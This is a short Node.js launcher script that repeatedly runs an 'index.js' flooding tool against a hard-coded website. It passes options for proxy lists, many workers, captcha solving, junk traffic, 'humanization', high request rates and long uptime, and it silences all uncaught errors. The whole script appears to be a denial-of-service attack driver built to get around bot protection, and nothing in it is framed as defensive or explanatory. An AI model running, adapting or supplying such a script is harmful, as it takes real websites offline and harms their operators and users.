const execSync = require('child_process').execSync;
var thread = process.argv[3]
var url = process.argv[2]

function get() {
    for (x = 0; x < thread; x++) {
        execSync(`node index.js https://antisec.tech/Welcome/ --humanization true --junk true --click true --workers 5 --captcha true --max_captchas 5 --mode tlsfl --time 1111 --proxy good.txt --uptime 60000 --rate 64 --pipe 1000 --debug true --click key`)
    }
}
get()

process.on('uncaughtException', function() {});
process.on('unhandledRejection', function() {});